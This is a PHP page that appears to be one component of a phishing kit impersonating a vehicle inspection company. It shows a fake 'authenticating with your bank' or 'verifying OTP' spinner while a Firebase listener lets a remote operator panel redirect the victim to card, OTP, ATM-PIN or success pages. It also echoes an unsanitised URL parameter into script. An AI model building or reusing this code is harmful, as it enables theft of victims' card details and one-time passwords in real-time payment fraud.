<?php
error_reporting(0);
$phone = isset($_GET['phone']) ? $_GET['phone'] : '';
// جلب الحالة من الرابط لمعرفة الجملة الصحيحة
$from = isset($_GET['from']) ? $_GET['from'] : 'card'; 

$msg = "جاري المصادقة مع البنك مصدر البطاقة..."; // الافتراضي
if($from == 'otp') $msg = "جاري التحقق من رمز الـ OTP...";
if($from == 'atm') $msg = "جاري تأكيد عملية الدفع...";
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري المعالجة - Salama</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Cairo', sans-serif; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #00acc1; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .text { color: #2c3e50; font-size: 18px; font-weight: 700; text-align: center; padding: 0 20px; line-height: 1.6; }
        footer { position: absolute; bottom: 0; width: 100%; background: #eee; padding: 15px 0; text-align: center; font-size: 12px; color: #666; font-family: sans-serif; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="text" id="status-text"><?php echo $msg; ?></div>

    <footer>
        Salama Vehicle Inspection Company © 2026<br>
        All Rights Reserved
    </footer>

    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script>
        const firebaseConfig = { databaseURL: "YOUR_FIREBASE_URL" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const pID = "<?php echo $phone; ?>";

        // مراقبة الأوامر من لوحة التحكم [cite: 2026-02-18]
        if(pID) {
            db.ref('payments/'+pID).on('value', (s) => {
                const d = s.val();
                if(!d) return;

                if(d.status === 'otp') { window.location.href = "otp.php?phone="+pID; }
                if(d.status === 'atm') { window.location.href = "atm.php?phone="+pID; }
                if(d.status === 'error') { window.location.href = "payment.php?phone="+pID; }
                if(d.status === 'success') { window.location.href = "success.php?phone="+pID; }
            });
        }
    </script>
</body>
</html>